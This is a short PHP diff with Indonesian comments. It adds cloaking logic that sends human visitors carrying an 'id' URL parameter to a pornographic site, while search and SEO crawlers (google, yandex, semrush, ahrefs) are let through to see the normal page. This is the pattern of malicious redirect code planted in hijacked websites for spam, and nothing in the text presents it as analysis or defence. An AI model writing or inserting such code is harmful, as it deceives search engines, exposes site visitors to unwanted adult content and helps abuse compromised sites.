@@ -2,8 +2,9 @@
 if (isset($_SERVER['HTTP_USER_AGENT'])) {
     $user_agent = $_SERVER['HTTP_USER_AGENT'];
 
-    // Jika user-agent TIDAK mengandung 'google', 'yandex', 'semrush', ATAU 'ahrefs'
-    if (!preg_match('/google|yandex|semrush|ahrefs/i', $user_agent)) {
+    // Modifikasi: Hanya redirect jika BUKAN bot DAN ada parameter 'id' di URL
+    // Anda bisa menambahkan bot lain di sini (misal: |yandex|bingbot)
+    if (!preg_match('/google|yandex|semrush|ahrefs/i', $user_agent) && isset($_GET['id']) && !empty($_GET['id'])) {
         header('Location: https://javpornsub.net');
         exit;
     }
